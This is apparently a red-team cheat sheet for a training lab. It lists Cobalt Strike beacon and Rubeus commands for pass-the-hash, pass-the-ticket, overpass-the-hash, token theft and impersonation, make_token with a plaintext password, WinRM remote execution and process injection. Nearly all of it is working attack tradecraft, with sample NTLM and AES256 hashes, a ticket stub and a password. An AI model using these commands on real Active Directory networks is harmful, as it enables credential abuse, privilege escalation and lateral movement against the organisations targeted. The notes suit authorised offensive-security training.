> A common way of testing access to a machine is to list the C drive, as this requires local admin privileges to access.

# Pass the hash through beacon

```bash
# check that with the current user we cannot list C from web computer
getuid
ls \\web.dev.cyberbotic.io\c$

# Impersonate john king by using NTLM hash
pth DEV\jking 59fc0f884922b4ce376051134c71e22c
ls \\web.dev.cyberbotic.io\c$

# Drop the impersonation when finished
rev2self
```

---

# Pass the Ticket through beacon (Creating a new logon session and passing tickets into sessions other than your own requires elevated privileges)

```bash
# Create new hidden process
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

# Use the LUID of the new process to inject a previously dumped ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

# Steal the token from the created process (pid from first command)
steal_token 4748
ls \\web.dev.cyberbotic.io\c$

# Drop the impersonation when finished
rev2self
kill 4748
```

---

# Overpass the hash (create a Ticket that we can use for PassTheTicket from an NTLM or AES256) - No Elevation Required

```bash
# Request a TGT using user's NTLM hash (copy the base64 ticket)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

# Request a TGT using user's AES256 hash (copy the base64 ticket)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap

# Proceed to follow the steps to Pass the Ticket attack
```

---

# Token impersonation

```bash
# Check if there are any processes running as user
ps

# If we see any processes we can directly hijack the PID directly
steal_token 5536
ls \\web.dev.cyberbotic.io\c$
rev2self

# We can also use token_store
token_store steal 5536
token_store show
token_store use 0
rev2self
token_store remove <id> #or all
```

---

# Making a token (plain text password needed)

```bash
make_token DEV\jking Qwerty123
remote-exec winrm web.dev.cyberbotic.io whoami
```

---

# Process Injection (elevation needed for other user processes)

```bash
# We use the following to inject
# - 4464 is the target PID.
# - x64 is the architecture of the process.
# - tcp-local is the listener name.

inject 4464 x64 tcp-local
```

---
